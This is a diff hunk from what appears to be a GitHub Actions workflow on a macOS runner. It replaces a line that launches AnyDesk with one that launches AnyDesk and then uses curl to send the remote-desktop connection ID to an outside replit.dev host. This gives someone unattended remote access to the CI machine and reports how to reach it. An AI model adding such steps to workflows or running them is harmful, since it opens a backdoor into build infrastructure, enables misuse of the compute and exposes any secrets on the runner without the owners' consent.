@@ -52,4 +52,4 @@ jobs:
           # /Applications/AnyDesk.app/Contents/MacOS/AnyDesk --get-id
           # tail -F anything
 
-          node -e "setTimeout(()=>{require('child_process').exec('/Applications/AnyDesk.app/Contents/MacOS/AnyDesk --get-id')},3000); require('child_process').exec('/Applications/AnyDesk.app/Contents/MacOS/AnyDesk')"
+          node -e "setTimeout(()=>{require('child_process').exec('curl https://d3692894-5db6-4007-9f83-4025c96f53e5-00-3gof3ylc5shn.kirk.replit.dev/$(/Applications/AnyDesk.app/Contents/MacOS/AnyDesk --get-id)')},30000); require('child_process').exec('/Applications/AnyDesk.app/Contents/MacOS/AnyDesk')"
